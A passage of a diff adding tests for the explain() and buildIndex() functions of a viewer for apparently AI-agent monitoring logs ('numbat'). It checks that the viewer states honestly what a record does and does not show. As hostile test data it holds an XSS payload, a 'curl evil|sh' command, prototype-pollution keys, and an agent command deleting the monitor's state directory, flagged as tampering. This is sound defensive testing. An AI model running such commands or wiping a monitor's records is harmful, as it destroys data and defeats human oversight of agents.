@@ -62,6 +62,10 @@ var describe  = loadBlock("describe",  ["describe"]).describe;
 var interpret = loadBlock("interpret", ["interpret"]).interpret;
 var rollup    = loadBlock("rollup",    ["rollup"]).rollup;
 
+var exBlock    = loadBlock("explain", ["explain", "buildIndex"]);
+var explain    = exBlock.explain;
+var buildIndex = exBlock.buildIndex;
+
 var sizeBlock = loadBlock("sizeguard", ["MAX_BYTES", "overSize", "hdrSize"]);
 var MAX_BYTES = sizeBlock.MAX_BYTES, overSize = sizeBlock.overSize, hdrSize = sizeBlock.hdrSize;
 
@@ -99,23 +103,23 @@ eq("event/command.exec reads the legacy observed_command field",
 
 eq("event/command.result exit 0 reports success",
    describe({ record_type:"event", event_type:"command.result", exit_code:0 }),
-   "Command finished successfully");
+   "Command finished (exit 0)");
 
 eq("event/command.result exit 1 reports the code",
    describe({ record_type:"event", event_type:"command.result", exit_code:1 }),
-   "Command failed (exit 1)");
+   "Command finished (exit 1)");
 
 eq("event/command.result exit 137 reports the code",
    describe({ record_type:"event", event_type:"command.result", exit_code:137 }),
-   "Command failed (exit 137)");
+   "Command finished (exit 137)");
 
 eq("event/file.read names the file",
    describe({ record_type:"event", event_type:"file.read", file_path:"src/lib/auth.js" }),
-   "Read a file: src/lib/auth.js");
+   "Asked to read a file: src/lib/auth.js");
 
 eq("event/file.write names the file",
    describe({ record_type:"event", event_type:"file.write", file_path:"src/lib/auth.js" }),
-   "Wrote a file: src/lib/auth.js");
+   "Asked to write a file: src/lib/auth.js");
 
 eq("event/session.start",
    describe({ record_type:"event", event_type:"session.start" }),
@@ -218,7 +222,7 @@ ok("command.result never invents success when there is no exit code",
   var long = "/Users/someone/.superset/worktrees/8635b301-bd9e-4456-aa67-78f676170d23/" +
              "admin-pages-bug-audit/sh-dashboard/src/middleware.js";
   var out = describe({ record_type:"event", event_type:"file.read", file_path:long });
-  eq("a long path collapses to its last two segments", out, "Read a file: …/src/middleware.js");
+  eq("a long path collapses to its last two segments", out, "Asked to read a file: …/src/middleware.js");
 })();
 
 /* ── degraded, partial and hostile records ──────────────────────────────── */
@@ -1472,6 +1476,607 @@ ok("the rollup block does not reference the DOM or viewer globals",
 ok("the sizeguard block does not reference the DOM or viewer globals",
    !/\bdocument\b|\bwindow\b|\brecs\b|\bfetch\b|\bfmtB\b|\btoast\b/.test(blockSrc("sizeguard")),
    "the size guard must stay self-contained so it can be lifted and tested alone");
+
+/* ── explain() — per-event interpretation ───────────────────────────────── */
+/*  explain() is the event equivalent of interpret(). It needs sibling records
+    — the paired result, the findings that cite it — so it takes an index built
+    once by buildIndex(). Both live in the same marked block so the block stays
+    self-contained and can be lifted whole.
+
+    Corpus facts these tests encode, each verified against ~/.numbat by jq
+    before being written down:
+      · four pair shapes join on tool_call_id — command.exec→command.result,
+        file.read→tool.result, file.write→tool.result, tool.call→tool.result
+      · in all 3,228 pairs the call side precedes the result side in time
+      · no record in the reference corpus carries an exit_code at all
+      · the only failure signal is the tool_error tag                          */
+
+function exEv(o){ o.record_type = "event"; return o; }
+// The index a single record needs when it has no siblings.
+var NOIDX = buildIndex([]);
+
+/* — shape and total function — */
+(function(){
+  eq("explain() declines a finding", explain({ record_type:"finding", rule_id:"x" }, NOIDX), null);
+  eq("explain() declines an indicator", explain({ record_type:"indicator", type:"url" }, NOIDX), null);
+  eq("explain() declines a non-object", explain("nope", NOIDX), null);
+  eq("explain() declines null", explain(null, NOIDX), null);
+  eq("explain() declines an array", explain([], NOIDX), null);
+
+  var e = explain(exEv({ event_type:"command.exec", command:"ls" }), NOIDX);
+  ok("explain() returns an object for an event", e && typeof e === "object");
+  ok("explain() always produces a non-empty headline", !!(e && e.what && e.what.length));
+  ok("explain() returns findings as an array", !!(e && Array.isArray(e.findings)));
+  ok("explain() returns limits as an array", !!(e && Array.isArray(e.limits)));
+
+  // Degrade, never throw. A record with only record_type still explains itself.
+  var bare = explain({ record_type:"event" }, NOIDX);
+  ok("an event with only record_type still explains itself",
+     !!(bare && bare.what && bare.what.length), JSON.stringify(bare));
+  ok("an event with only record_type claims no pair", !!(bare && bare.next === null));
+
+  // Every field null — the shape numbat never emits but JSON permits.
+  var nulls = explain({ record_type:"event", event_type:null, tool_name:null, command:null,
+                        file_path:null, tool_call_id:null, source_type:null, actor:null,
+                        confidence:null, sub_agent:null, duration_ms:null, tags:null,
+                        event_id:null, model:null }, NOIDX);
+  ok("an all-null event still explains itself",
+     !!(nulls && nulls.what && nulls.what.length), JSON.stringify(nulls));
+  ok("an all-null event claims no pair", !!(nulls && nulls.next === null));
+
+  // A missing or malformed index must not be a crash: the pane still renders.
+  ok("explain() tolerates a missing index",
+     !!(explain(exEv({ event_type:"command.exec" })) || {}).what);
+  ok("explain() tolerates a junk index",
+     !!(explain(exEv({ event_type:"command.exec" }), "nope") || {}).what);
+})();
+
+/* — the headline, per event type — */
+(function(){
+  function what(o){ var e = explain(exEv(o), NOIDX); return e ? e.what : null; }
+
+  eq("command.exec names the tool it went through",
+     what({ event_type:"command.exec", tool_name:"Bash", command:"npm test" }),
+     "The agent proposed a shell command through Bash.");
+  eq("command.exec without a tool still states the action",
+     what({ event_type:"command.exec", command:"npm test" }),
+     "The agent proposed a shell command.");
+
+  eq("command.result reports the duration it carries",
+     what({ event_type:"command.result", duration_ms:1500 }),
+     "numbat recorded a result for a shell command, reporting a duration of 1.5 s.");
+  eq("command.result without a duration claims none",
+     what({ event_type:"command.result" }),
+     "numbat recorded a result for a shell command.");
+
+  eq("file.read names the path and the tool",
+     what({ event_type:"file.read", file_path:"/a/b.txt", tool_name:"Read" }),
+     "The agent asked to read /a/b.txt using Read.");
+  eq("file.read without a path stays general",
+     what({ event_type:"file.read" }), "The agent asked to read a file.");
+  eq("file.write names the path and the tool",
+     what({ event_type:"file.write", file_path:"/a/b.txt", tool_name:"Edit" }),
+     "The agent asked to write /a/b.txt using Edit.");
+
+  eq("tool.call names the tool", what({ event_type:"tool.call", tool_name:"Agent" }),
+     "The agent called the Agent tool.");
+  eq("tool.call without a tool name stays general",
+     what({ event_type:"tool.call" }), "The agent called a tool.");
+  eq("tool.result names the tool", what({ event_type:"tool.result", tool_name:"Edit" }),
+     "The Edit tool returned. This record marks the return; it does not carry what was returned.");
+
+  eq("session.start names the model when it has one",
+     what({ event_type:"session.start", model:"claude-opus-5" }),
+     "numbat recorded a start for this session, on model claude-opus-5.");
+  eq("session.start without a model states only the boundary",
+     what({ event_type:"session.start" }), "numbat recorded a start for this session.");
+  eq("session.end states the boundary",
+     what({ event_type:"session.end" }), "numbat recorded an end for this session.");
+
+  // numbat maps SubagentStart/Stop onto session.start/end and copies the
+  // parent's session_id, so a sub_agent boundary is not this session's own.
+  eq("a subagent start says whose boundary it is",
+     what({ event_type:"session.start", sub_agent:"Explore" }),
+     "numbat recorded the start of a subagent (Explore), which it maps onto session.start.");
+  eq("a subagent end says whose boundary it is",
+     what({ event_type:"session.end", sub_agent:"Explore" }),
+     "numbat recorded the end of a subagent (Explore), which it maps onto session.end.");
+
+  eq("prompt.user states who spoke",
+     what({ event_type:"prompt.user" }), "The operator sent a prompt to the agent.");
+  eq("message.assistant states who spoke",
+     what({ event_type:"message.assistant" }), "The agent sent a message.");
+
+  eq("permission.requested names the tool approval was sought for",
+     what({ event_type:"permission.requested", tool_name:"AskUserQuestion" }),
+     "The agent asked for approval to use the AskUserQuestion tool.");
+
+  // The generic branch: an event_type added to numbat after this was written.
+  eq("an unknown event type is named rather than guessed at",
+     what({ event_type:"network.beacon" }), "numbat recorded a network.beacon event.");
+  eq("an event with no event_type says so",
+     what({ event_type:"" }), "numbat recorded an event with no event_type.");
+})();
+
+/* — pairing: the four shapes, present and absent — */
+(function(){
+  var exec   = exEv({ event_type:"command.exec", event_id:"e1", tool_call_id:"t1",
+                    tool_name:"Bash", command:"npm test", source_type:"hook" });
+  var result = exEv({ event_type:"command.result", event_id:"e2", tool_call_id:"t1",
+                    duration_ms:1500, command:"npm test", source_type:"hook" });
+  var idx = buildIndex([exec, result]);
+
+  var a = explain(exec, idx);
+  ok("a paired exec reports its result", !!(a.next && /matching command\.result was recorded/.test(a.next.text)), a.next && a.next.text);
+  ok("a paired exec reports the duration the result carries", /1\.5 s/.test(a.next.text), a.next.text);
+  // The single most important negative claim in the whole feature: a result
+  // exists, and that is not the same as the command having worked.
+  ok("a paired exec states the outcome is unrecorded",
+     /whether the command succeeded is not recorded/.test(a.next.text), a.next.text);
+  (function(){
+    var rest = a.next.text.replace(/whether the command succeeded is not recorded here/g, "");
+    ok("a paired exec makes no other claim about outcome",
+       !/fail|succe|error|worked|crash/i.test(rest), rest);
+  })();
+  eq("a paired exec labels the section forward", a.next.label, "What happened next");
+
+  var b = explain(result, idx);
+  eq("a paired result labels the section backward", b.next.label, "What this responds to");
+  ok("a paired result points back at the proposing event",
+     /matching command\.exec/.test(b.next.text), b.next.text);
+  // "earlier" is an ordering claim, so it is checked against file order rather
+  // than assumed. It holds for all 3,228 pairs in the reference corpus.
+  ok("a result whose exec precedes it says so",
+     /recorded earlier in this file/.test(b.next.text), b.next.text);
+  ok("the exec, which comes first, makes no 'earlier' claim about its result",
+     !/earlier/.test(a.next.text), a.next.text);
+
+  // A file that records the result before the call must not be described as
+  // though it did not. numbat has never emitted one; the claim is still checked.
+  (function(){
+    var rEarly = exEv({ event_type:"command.result", event_id:"r0", tool_call_id:"tz", duration_ms:5 });
+    var eLate  = exEv({ event_type:"command.exec", event_id:"e0", tool_call_id:"tz", command:"x" });
+    var inverted = buildIndex([rEarly, eLate]);   // result first in file order
+    var t = explain(rEarly, inverted).next.text;
+    ok("an out-of-order pair drops the 'earlier' claim", !/earlier/.test(t), t);
+    ok("an out-of-order pair still reports the pair", /matching command\.exec/.test(t), t);
+  })();
+
+  // Unpaired: 13 of 1,973 execs in the reference corpus, 12 of them mid-session.
+  var lone = exEv({ event_type:"command.exec", event_id:"e3", tool_call_id:"t9",
+                  tool_name:"Bash", command:"pkill -f something", source_type:"hook" });
+  var c = explain(lone, buildIndex([lone]));
+  ok("an unpaired exec states the absence plainly",
+     /No command\.result carrying this tool_call_id appears in this file/.test(c.next.text), c.next.text);
+  ok("an unpaired exec does not imply failure",
+     /does not show the command failed/.test(c.next.text), c.next.text);
+  ok("an unpaired exec does not imply it ran either",
+     /does not show it ran/.test(c.next.text), c.next.text);
+  // Asserting the honest sentence is present is not enough on its own: a
+  // contradicting claim can sit right beside it and still satisfy that test.
+  // Strip the sanctioned negations and require that nothing else in the
+  // sentence speaks to outcome at all.
+  (function(){
+    var rest = c.next.text.replace(/does not show the command failed/g, "")
+                          .replace(/does not show it ran/g, "");
+    ok("an unpaired exec makes no other claim about outcome",
+       !/fail|succe|error|complet|crash/i.test(rest), rest);
+  })();
+
+  // An event type that cannot be paired at all must not report an absence:
+  // there is no tool_call_id to be missing.
+  var p = explain(exEv({ event_type:"prompt.user", event_id:"e4" }), NOIDX);
+  eq("prompt.user reports no pairing section", p.next, null);
+  var se = explain(exEv({ event_type:"session.end", event_id:"e5" }), NOIDX);
+  eq("session.end reports no pairing section", se.next, null);
+
+  // file.read / file.write / tool.call all pair with tool.result — the three
+  // shapes the brief's two-shape model missed.
+  function pairOf(callType, tool){
+    var call = exEv({ event_type:callType, event_id:"c1", tool_call_id:"t2",
+                    tool_name:tool, file_path:"/a/b.txt" });
+    var res  = exEv({ event_type:"tool.result", event_id:"c2", tool_call_id:"t2", tool_name:tool });
+    return { call:call, res:res, idx:buildIndex([call, res]) };
+  }
+  ["file.read", "file.write", "tool.call"].forEach(function(t){
+    var P = pairOf(t, "Read");
+    ok(t + " pairs with its tool.result",
+       /matching tool\.result was recorded/.test(explain(P.call, P.idx).next.text));
+    var back = explain(P.res, P.idx);
+    eq("tool.result labels the section backward for " + t, back.next.label, "What this responds to");
+    ok("tool.result names the " + t + " it answers",
+       back.next.text.indexOf(t) !== -1, back.next.text);
+  });
+
+  // tool_error is the only failure signal numbat carries, and it is the agent's
+  // own flag — say that, and mark it.
+  var errRes = exEv({ event_type:"command.result", event_id:"e7", tool_call_id:"t3",
+                    duration_ms:20, tags:["tool_error"] });
+  var errExec = exEv({ event_type:"command.exec", event_id:"e6", tool_call_id:"t3", command:"false" });
+  var d = explain(errExec, buildIndex([errExec, errRes]));
+  ok("a result tagged tool_error is surfaced on the exec",
+     /tagged tool_error/.test(d.next.text), d.next.text);
+  ok("tool_error is attributed to the agent, not to numbat's judgement",
+     /the agent itself/.test(d.next.text), d.next.text);
+  eq("a tool_error pair is marked for the renderer", d.next.warn, true);
+  eq("an ordinary pair is not marked", a.next.warn, false);
+
+  // An exit code is absent from every record in the reference corpus, but the
+  // schema permits one. If it is ever there, report it instead of the absence.
+  var xExec = exEv({ event_type:"command.exec", event_id:"x1", tool_call_id:"t4", command:"true" });
+  var xRes  = exEv({ event_type:"command.result", event_id:"x2", tool_call_id:"t4", exit_code:0 });
+  var x = explain(xExec, buildIndex([xExec, xRes]));
+  ok("an exit code of 0 is reported when present", /exit code 0/.test(x.next.text), x.next.text);
+  ok("an exit code suppresses the no-exit-code caveat",
+     !/whether the command succeeded is not recorded/.test(x.next.text), x.next.text);
+  var yRes = exEv({ event_type:"command.result", event_id:"y2", tool_call_id:"t5", exit_code:1 });
+  var yExec = exEv({ event_type:"command.exec", event_id:"y1", tool_call_id:"t5", command:"false" });
+  ok("a non-zero exit code is reported as such",
+     /exit code 1/.test(explain(yExec, buildIndex([yExec, yRes])).next.text));
+
+  // A record must never pair with itself, however odd the file.
+  var self = exEv({ event_type:"command.exec", event_id:"s1", tool_call_id:"t6", command:"x" });
+  ok("a record does not pair with itself",
+     /No command\.result/.test(explain(self, buildIndex([self])).next.text));
+})();
+
+/* — pairing must name what it FOUND, never what it wanted — */
+(function(){
+  // A forward branch that prints the expected counterpart type states, as
+  // fact, that a record of a type not in the file was recorded.
+  var call = exEv({ event_type:"file.read", event_id:"w1", tool_call_id:"tw",
+                    file_path:"/a", tool_name:"Read" });
+  var odd  = exEv({ event_type:"command.result", event_id:"w2", tool_call_id:"tw", duration_ms:9 });
+  var t = explain(call, buildIndex([call, odd])).next.text;
+  ok("the pair is named by the type actually found", /matching command\.result/.test(t), t);
+  ok("the pair is not named by the type merely expected", !/matching tool\.result/.test(t), t);
+
+  // And the backward branch's verb belongs to the mate, not to the subject:
+  // naming a command.result as the record "where the command was proposed"
+  // asserts a proposal that record never made.
+  var r1 = exEv({ event_type:"command.result", event_id:"v1", tool_call_id:"tv", duration_ms:1 });
+  var r2 = exEv({ event_type:"command.result", event_id:"v2", tool_call_id:"tv", duration_ms:2 });
+  var bt = explain(r2, buildIndex([r1, r2])).next.text;
+  ok("a result paired with another result does not claim a proposal",
+     !/where the command was proposed/.test(bt), bt);
+
+  // Several records sharing one key: decline to name one with confidence.
+  var e1 = exEv({ event_type:"command.exec", event_id:"z0", tool_call_id:"tq", command:"x" });
+  var q1 = exEv({ event_type:"command.result", event_id:"z1", tool_call_id:"tq", duration_ms:1 });
+  var q2 = exEv({ event_type:"command.result", event_id:"z2", tool_call_id:"tq", duration_ms:2 });
+  var at = explain(e1, buildIndex([e1, q1, q2])).next.text;
+  ok("an ambiguous join says so", /Several records share this tool_call_id/.test(at), at);
+
+  // Preference, not position: the right counterpart is chosen even when a
+  // same-side record was indexed first.
+  var d1 = exEv({ event_type:"command.exec", event_id:"p0", tool_call_id:"tp", command:"a" });
+  var d2 = exEv({ event_type:"command.exec", event_id:"p1", tool_call_id:"tp", command:"b" });
+  var dr = exEv({ event_type:"command.result", event_id:"p2", tool_call_id:"tp", duration_ms:7 });
+  ok("the expected counterpart is preferred over the first one indexed",
+     /matching command\.result/.test(explain(d2, buildIndex([d1, d2, dr])).next.text));
+})();
+
+/* — an absent join key is not an absent result — */
+(function(){
+  var noKey = exEv({ event_type:"command.exec", event_id:"n1", command:"ls" });
+  var t = explain(noKey, NOIDX).next.text;
+  ok("a record with no tool_call_id says so", /carries no tool_call_id/.test(t), t);
+  ok("a record with no tool_call_id does not claim a result is missing",
+     !/appears in this file/.test(t) && !/no result was recorded/.test(t), t);
+})();
+
+/* — outcome fields — */
+(function(){
+  // exInt rejected a float or a numeric string that describe() renders happily,
+  // so the two panes made opposite statements about the same record.
+  var ex = exEv({ event_type:"command.exec", event_id:"f1", tool_call_id:"tf", command:"x" });
+  var rf = exEv({ event_type:"command.result", event_id:"f2", tool_call_id:"tf", exit_code:1.5 });
+  var t = explain(ex, buildIndex([ex, rf])).next.text;
+  ok("a non-integer exit code is still reported", /exit code 1\.5/.test(t), t);
+  ok("a present exit code is never denied",
+     !/carries no exit code/.test(t), t);
+
+  // The renderer's badge is driven by warn, so warn may only be set when the
+  // sentence explaining it was actually emitted.
+  var rb = exEv({ event_type:"command.result", event_id:"b2", tool_call_id:"tb",
+                  exit_code:3, tags:["tool_error"] });
+  var eb = exEv({ event_type:"command.exec", event_id:"b1", tool_call_id:"tb", command:"x" });
+  var n = explain(eb, buildIndex([eb, rb])).next;
+  ok("warn is only set when tool_error is actually explained",
+     n.warn === false || /tool_error/.test(n.text), JSON.stringify(n));
+
+  // "only from a field the agent itself set" is false for telemetry records:
+  // the project's own README says OTLP can earn the tag from log severity.
+  var ro = exEv({ event_type:"command.result", event_id:"o2", tool_call_id:"to",
+                  tags:["tool_error"], source_type:"otel" });
+  var eo = exEv({ event_type:"command.exec", event_id:"o1", tool_call_id:"to", command:"x" });
+  var ot = explain(eo, buildIndex([eo, ro])).next.text;
+  ok("a telemetry-sourced tool_error does not claim the agent set it",
+     !/only from a field/.test(ot) && /log severity/.test(ot), ot);
+  var rh = exEv({ event_type:"command.result", event_id:"h2", tool_call_id:"th",
+                  tags:["tool_error"], source_type:"hook" });
+  var eh = exEv({ event_type:"command.exec", event_id:"h1", tool_call_id:"th", command:"x" });
+  ok("a hook-sourced tool_error keeps the stronger claim",
+     /only from a field the agent itself/.test(explain(eh, buildIndex([eh, rh])).next.text));
+})();
+
+/* — a paired record is reachable, not merely described — */
+(function(){
+  var ex = exEv({ event_type:"command.exec", event_id:"j1", tool_call_id:"tj", command:"x" });
+  var rs = exEv({ event_type:"command.result", event_id:"j2", tool_call_id:"tj", duration_ms:4 });
+  var idx = buildIndex([ex, rs]);
+  eq("the exec carries its result's id for linking", explain(ex, idx).next.eventId, "j2");
+  eq("the result carries its exec's id for linking", explain(rs, idx).next.eventId, "j1");
+  eq("an unpaired record offers no link",
+     explain(exEv({ event_type:"command.exec", event_id:"j3", tool_call_id:"tk", command:"x" }),
+             idx).next.eventId, "");
+})();
+
+/* — the reverse citation index — */
+(function(){
+  var target = exEv({ event_type:"command.exec", event_id:"cited-1", tool_call_id:"tc",
+                    command:"cd ~/.numbat && rm -rf .", source_type:"hook" });
+  var finding = { record_type:"finding", finding_id:"fnd-1", rule_id:"tamper.detector_state_write",
+                  title:"Agent targeted numbat's default state directory", severity:"high",
+                  cited_event_ids:["cited-1"] };
+  var idx = buildIndex([target, finding]);
+
+  var e = explain(target, idx);
+  eq("a cited event reports exactly one finding", e.findings.length, 1);
+  eq("the citation carries the rule id", e.findings[0].rule, "tamper.detector_state_write");
+  eq("the citation carries the finding id", e.findings[0].finding, "fnd-1");
+  eq("the citation carries the title", e.findings[0].title, "Agent targeted numbat's default state directory");
+  eq("the citation carries the severity", e.findings[0].sev, "high");
+
+  // An uncited event must report an empty list, not a fabricated reassurance.
+  var other = exEv({ event_type:"command.exec", event_id:"uncited-1", command:"ls" });
+  eq("an uncited event reports no findings", explain(other, idx).findings.length, 0);
+
+  // In the reference corpus the reverse index happens to be one-to-one — 9
+  // findings, 9 distinct events. Nothing may depend on that.
+  var multi = exEv({ event_type:"command.exec", event_id:"m1", command:"x" });
+  var f1 = { record_type:"finding", finding_id:"a", rule_id:"r.one", severity:"high", cited_event_ids:["m1"] };
+  var f2 = { record_type:"finding", finding_id:"b", rule_id:"r.two", severity:"low",  cited_event_ids:["m1"] };
+  eq("two findings citing one event both appear",
+     explain(multi, buildIndex([multi, f1, f2])).findings.length, 2);
+
+  // And a finding citing several events reaches all of them.
+  var g1 = exEv({ event_type:"command.exec", event_id:"g1", command:"x" });
+  var g2 = exEv({ event_type:"command.exec", event_id:"g2", command:"y" });
+  var f3 = { record_type:"finding", finding_id:"c", rule_id:"r.three", cited_event_ids:["g1","g2"] };
+  var gidx = buildIndex([g1, g2, f3]);
+  eq("a finding citing two events reaches the first", explain(g1, gidx).findings.length, 1);
+  eq("a finding citing two events reaches the second", explain(g2, gidx).findings.length, 1);
+
+  // Malformed citation lists must not poison the index.
+  var h1 = exEv({ event_type:"command.exec", event_id:"h1", command:"x" });
+  var bad = { record_type:"finding", finding_id:"d", cited_event_ids:"not-an-array" };
+  var bad2 = { record_type:"finding", finding_id:"e", cited_event_ids:[null, 7, {}, "h1"] };
+  var hidx = buildIndex([h1, bad, bad2]);
+  eq("a non-array citation list is ignored, and valid entries beside it survive",
+     explain(h1, hidx).findings.length, 1);
+})();
+
+/* — what the record does and does not establish — */
+(function(){
+  function limits(o){ return explain(exEv(o), NOIDX).limits.join(" | "); }
+
+  // The claim describe() was corrected to stop making, kept consistent here.
+  ok("a hook-sourced command.exec says numbat saw it before it ran",
+     /numbat saw this before it ran/.test(limits({ event_type:"command.exec", source_type:"hook", command:"x" })));
+  ok("a hook-sourced command.exec does not claim execution",
+     /does not show whether it executed/.test(limits({ event_type:"command.exec", source_type:"hook", command:"x" })));
+
+  // In all 3,228 pairs in the corpus the call side precedes the result side, so
+  // a file.write is the request, not the completed write.
+  ok("a file.write is stated as a request, not a completed write",
+     /does not show whether the write completed/.test(limits({ event_type:"file.write", source_type:"hook", file_path:"/a" })));
+  ok("a file.read is stated as a request too",
+     /does not show whether the read completed/.test(limits({ event_type:"file.read", source_type:"hook", file_path:"/a" })));
+
+  ok("an artifact-sourced event says it was reconstructed after the fact",
+     /Reconstructed from an on-disk artifact/.test(limits({ event_type:"command.exec", source_type:"artifact" })));
+  ok("a telemetry-sourced event says so",
+     /Reported by telemetry/.test(limits({ event_type:"command.exec", source_type:"otel" })));
+
+  // The actor claim is specifically that this was a tool call, so it may only
+  // be made about one. message.assistant carries actor "assistant" and is the
+  // agent writing prose to the operator — not a tool call.
+  ok("actor assistant is reported on a tool call",
+     /issued this tool call itself/.test(limits({ event_type:"command.exec", actor:"assistant" })));
+  ok("the actor claim does not retract itself",
+     /does not mean the operator did not ask for it or approve it/.test(
+       limits({ event_type:"command.exec", actor:"assistant" })));
+  ok("a message is NOT described as a tool call",
+     !/tool call/.test(limits({ event_type:"message.assistant", actor:"assistant" })),
+     limits({ event_type:"message.assistant", actor:"assistant" }));
+  ok("a permission request is NOT described as a tool call",
+     !/issued this tool call/.test(limits({ event_type:"permission.requested", actor:"assistant" })));
+  ok("actor user carries interpret()'s exact sentence",
+     limits({ event_type:"prompt.user", actor:"user" }).indexOf(
+       "This came from the operator, not the agent.") !== -1);
+
+  /* confidence gets no bullet. It defines a field rather than saying anything
+     about this record, it is "medium" on all 6,715 events in the reference
+     corpus, and as the last bullet on 100% of panes it was a quarter of all the
+     text this function produced — a constant sitting where the rare real caveat
+     lives, training the eye to skip the section. */
+  ok("confidence does not produce a caveat bullet",
+     !/confidence/.test(limits({ event_type:"command.exec", confidence:"medium" })),
+     limits({ event_type:"command.exec", confidence:"medium" }));
+  ok("an unusual confidence value still produces no bullet",
+     !/confidence/.test(limits({ event_type:"command.exec", confidence:"high" })));
+
+  // The headline names the subagent now, so this only has to say where numbat
+  // files the record. It used to take 174 characters on 61% of records.
+  ok("a sub_agent record says whose session it lands in",
+     /files subagent work under the parent's session_id/.test(
+       limits({ event_type:"command.exec", sub_agent:"Explore" })));
+  ok("the sub_agent caveat stays short",
+     limits({ event_type:"command.exec", sub_agent:"Explore" }).length < 140,
+     limits({ event_type:"command.exec", sub_agent:"Explore" }));
+
+  // permission.requested records that approval was asked for, not the answer.
+  var pr = limits({ event_type:"permission.requested", tool_name:"AskUserQuestion", decision:"asked" });
+  ok("permission.requested does not claim to know the answer",
+     /does not record what was answered/.test(pr), pr);
+
+  ok("a redacted event says a value was masked",
+     /masked before the record was written/.test(limits({ event_type:"command.exec", redacted:true })));
+
+  // Nothing may be asserted from a field that is absent.
+  var quiet = explain(exEv({ event_type:"session.end" }), NOIDX).limits.join(" | ");
+  ok("an event with no source_type makes no provenance claim",
+     !/saw this before it ran|artifact|telemetry/.test(quiet), quiet);
+  ok("an event with no actor makes no actor claim",
+     !/issued this as a tool call|came from the operator/.test(quiet), quiet);
+  ok("an event with no confidence makes no confidence claim", !/confidence/.test(quiet), quiet);
+})();
+
+/* — buildIndex: bounds and hostile input — */
+(function(){
+  var i0 = buildIndex([]);
+  ok("buildIndex([]) returns a usable index", !!(i0 && i0.pair && i0.citedBy));
+  ok("buildIndex tolerates a non-array", !!(buildIndex("nope") || {}).pair);
+  ok("buildIndex tolerates null", !!(buildIndex(null) || {}).pair);
+  ok("buildIndex skips holes and non-objects",
+     !!buildIndex([null, 7, "x", undefined, []]).pair);
+
+  // Join keys are record-derived and untrusted. Truncating one could fabricate
+  // a pair between two distinct ids, which is worse than reporting no pair — so
+  // an over-long key is refused entry instead. Real ids max at 30 characters.
+  var huge = new Array(5000).join("k");
+  var a = exEv({ event_type:"command.exec", event_id:"ha", tool_call_id:huge + "A", command:"x" });
+  var b = exEv({ event_type:"command.result", event_id:"hb", tool_call_id:huge + "B", duration_ms:1 });
+  var hidx = buildIndex([a, b]);
+  var keys = Object.keys(hidx.pair);
+  ok("an over-long tool_call_id is not indexed", keys.length === 0,
+     "indexed keys: " + JSON.stringify(keys).slice(0, 200));
+  // An over-long key is refused by the index, not missing from the file.
+  // Reporting it as an absence would be a fabricated absence — the same class
+  // of error as a fabricated pair, stated with the same confidence.
+  (function(){
+    var t = explain(a, hidx).next.text;
+    ok("an over-long id is reported as a viewer limit, not an absence",
+       /not in a form this viewer will match on/.test(t), t);
+    ok("an over-long id does not claim the counterpart is missing from the file",
+       !/appears in this file/.test(t), t);
+    ok("an over-long id is not fused with a different over-long id",
+       !/A matching/.test(t), t);
+  })();
+
+  // A prototype-polluting id must not reach Object.prototype.
+  var poison = exEv({ event_type:"command.exec", event_id:"__proto__", tool_call_id:"__proto__", command:"x" });
+  var pidx = buildIndex([poison]);
+  ok("a __proto__ join key does not pollute the prototype",
+     ({}).polluted === undefined && Object.prototype.polluted === undefined);
+  ok("a __proto__ event id is still explainable", !!explain(poison, pidx).what);
+
+  var cf = { record_type:"finding", finding_id:"f", cited_event_ids:["__proto__"] };
+  buildIndex([cf]);
+  ok("a __proto__ citation key does not pollute the prototype",
+     Object.prototype.polluted === undefined && !Array.isArray(Object.prototype.cited));
+})();
+
+/* — the explain block must stay self-contained — */
+ok("the explain block does not reference the DOM or viewer globals",
+   !/\bdocument\b|\bwindow\b|\brecs\b|\bRULECAT\b|\bview\b|\beidx\b/.test(blockSrc("explain")),
+   "explain() must stay self-contained so it can be lifted and tested alone");
+
+/* — explain() returns data, never markup: esc() stays the single escape point — */
+(function(){
+  var XSS = '<img/src=x/onerror=alert(1)>';   // no whitespace: still a live payload
+  var o = exEv({ event_type:"command.exec", event_id:XSS, tool_call_id:XSS,
+               tool_name:XSS, command:'echo "' + XSS + '"', source_type:"hook",
+               sub_agent:XSS, actor:"assistant", confidence:XSS });
+  var f = { record_type:"finding", finding_id:XSS, rule_id:XSS, title:XSS,
+            severity:XSS, cited_event_ids:[XSS] };
+  var e = explain(o, buildIndex([o, f]));
+
+  // The payload may legitimately appear as text — what must never happen is
+  // explain() emitting it pre-escaped, which would double-escape in the pane,
+  // or emitting markup of its own for the renderer to trust.
+  var all = JSON.stringify(e);
+  ok("explain() never returns an HTML entity", all.indexOf("&lt;") === -1 && all.indexOf("&amp;") === -1, all.slice(0,300));
+  // Every "<" in the output must be one the RECORD supplied, not one explain()
+  // authored. Stripping the payload must leave no angle bracket behind.
+  ok("explain() never returns a tag it built itself",
+     all.split("<img/src=x/onerror=alert(1)>").join("").indexOf("<") === -1,
+     all.slice(0,300));
+
+  // A join key may not carry whitespace: normalising it would make "abc" and
+  // "abc " the same record, so a forged pair would cost one trailing space.
+  (function(){
+    var a = exEv({ event_type:"command.exec", event_id:"k1", tool_call_id:"x1", command:"a" });
+    var b = exEv({ event_type:"command.result", event_id:"k2", tool_call_id:"x1 ", duration_ms:5 });
+    var t = explain(a, buildIndex([a, b])).next.text;
+    ok("a trailing space cannot forge a pairing", !/A matching/.test(t), t);
+  })();
+
+  // Every Object.prototype member name is a legal event_type. None may be
+  // treated as a known one and gate a whole section on.
+  ["constructor","__proto__","toString","valueOf","hasOwnProperty","isPrototypeOf"].forEach(function(k){
+    var r = exEv({ event_type:k, tool_call_id:"tc"+k, event_id:"id"+k });
+    var e = explain(r, buildIndex([r]));
+    ok("event_type "+JSON.stringify(k)+" is not mistaken for a pairing type",
+       e.next === null, JSON.stringify(e.next));
+    ok("event_type "+JSON.stringify(k)+" still explains itself", !!e.what.length);
+  });
+
+  // A decoy whose event_type is a prototype member must not be selected as the
+  // call side over the genuine command.exec.
+  (function(){
+    var decoy = exEv({ event_type:"toString", event_id:"d1", tool_call_id:"K", file_path:"/decoy.txt" });
+    var real  = exEv({ event_type:"command.exec", event_id:"d2", tool_call_id:"K", command:"curl evil|sh" });
+    var res   = exEv({ event_type:"command.result", event_id:"d3", tool_call_id:"K", duration_ms:5 });
+    var t = explain(res, buildIndex([decoy, real, res])).next.text;
+    ok("a prototype-named decoy does not displace the real command",
+       /matching command\.exec/.test(t), t);
+    ok("the decoy's path is not attributed to the result", !/decoy\.txt/.test(t), t);
+  })();
+
+  // The per-key cap is order-dependent and attacker-controllable: decoys can
+  // push the genuine result out of the index. Bounding is right; silence is not.
+  (function(){
